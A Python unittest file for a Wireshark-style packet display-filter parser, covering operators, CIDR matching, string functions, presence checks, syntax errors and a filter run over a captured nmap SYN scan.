class TestFilters(unittest.TestCase):
    FIELDS = {
        "ip.src": "10.0.0.5", "ip.dst": "10.0.0.9",
        "tcp.srcport": 51000, "tcp.dstport": 443,
        "tcp.flags.syn": 1, "tcp.flags.ack": 0, "tcp.window_size": 800,
        "http.server": "Apache/2.4", "http.host": "foo.php.example",
        "dns.qry.name.len": 55, "frame.number": 7,
    }

    def _t(self, expr, want):
        self.assertEqual(evaluate(parse_filter(expr), self.FIELDS), want, expr)

    def test_equality(self):
        self._t("ip.src == 10.0.0.5", True)
        self._t("ip.src == 10.0.0.9", False)
        self._t("ip.src != 10.0.0.9", True)

    def test_ip_addr_alias_matches_either_direction(self):
        self._t("ip.addr == 10.0.0.5", True)
        self._t("ip.addr == 10.0.0.9", True)
        self._t("ip.addr == 10.0.0.1", False)

    def test_cidr_membership(self):
        self._t("ip.addr == 10.0.0.0/24", True)
        self._t("ip.addr == 10.10.10.0/24", False)

    def test_numeric_operators(self):
        self._t("tcp.window_size <= 1024", True)
        self._t("tcp.window_size > 1024", False)
        self._t("tcp.flags.syn==1 and tcp.flags.ack==0", True)

    def test_hex_literal(self):
        self.FIELDS["ip.ttl"] = 250
        self._t("ip.ttl >= 0xFA", True)
        del self.FIELDS["ip.ttl"]

    def test_port_alias(self):
        self._t("tcp.port == 443", True)
        self._t("tcp.port in {80 443 8080}", True)
        self._t("tcp.port in {21 22 23}", False)

    def test_contains_and_matches(self):
        self._t('http.server contains "Apache"', True)
        self._t('http.server contains "nginx"', False)
        self._t(r'http.host matches "\.(php|html)"', True)
        self._t(r'http.host matches "\.(exe|zip)$"', False)

    def test_functions(self):
        self._t('upper(http.server) contains "APACHE"', True)
        self._t('lower(http.server) contains "apache"', True)
        self._t('string(frame.number) matches "[13579]$"', True)

    def test_presence(self):
        self._t("tcp", True)
        self._t("arp", False)
        self._t("http.server", True)
        self._t("http.request", False)

    def test_logic(self):
        self._t("not (ip.src == 10.0.0.9)", True)
        self._t("ip.src == 10.0.0.9 or tcp.port == 443", True)
        self._t("ip.src == 10.0.0.9 && tcp.port == 443", False)

    def test_keyword_operators(self):
        self._t("ip.ttl gt 250", False)  # field absent -> False, not an error

    def test_bad_syntax_raises(self):
        with self.assertRaises(FilterSyntaxError):
            parse_filter("ip.src ===")
        with self.assertRaises(FilterSyntaxError):
            parse_filter("(ip.src == 10.0.0.5")

    def test_apply_filter_over_packets(self):
        packets = read_pcap(_p("nmap_syn"))
        matched = apply_filter(
            "tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size <= 1024", packets)
        self.assertTrue(matched)
        self.assertTrue(all(p.fields.get("tcp.window_size", 9999) <= 1024 for p in matched))


